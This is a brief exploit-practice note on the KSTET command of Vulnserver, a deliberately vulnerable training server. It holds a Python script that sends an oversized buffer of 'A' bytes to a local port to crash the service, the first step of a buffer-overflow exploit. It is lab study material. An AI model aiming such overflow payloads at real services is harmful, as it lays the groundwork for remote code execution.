# Vulnserver - Command KSTET

Downloaded from: https://github.com/stephenbradshaw/vulnserver

## Initial Crash
```py
import struct
import socket


TARGET_IP = "127.0.0.1"
TARGET_PORT = 9999
target = (TARGET_IP, TARGET_PORT)  # vulnserver


VULNSRVR_CMD = b"KSTET "  # change me
CRASH_LEN = 1000  # change me

payload = VULNSRVR_CMD
payload += b"A" * CRASH_LEN

with socket.create_connection(target) as sock:
    sock.recv(512)  # Welcome to Vulnerable Server! ... 

    sent = sock.send(payload)
    print(f"sent {sent} bytes")
```    
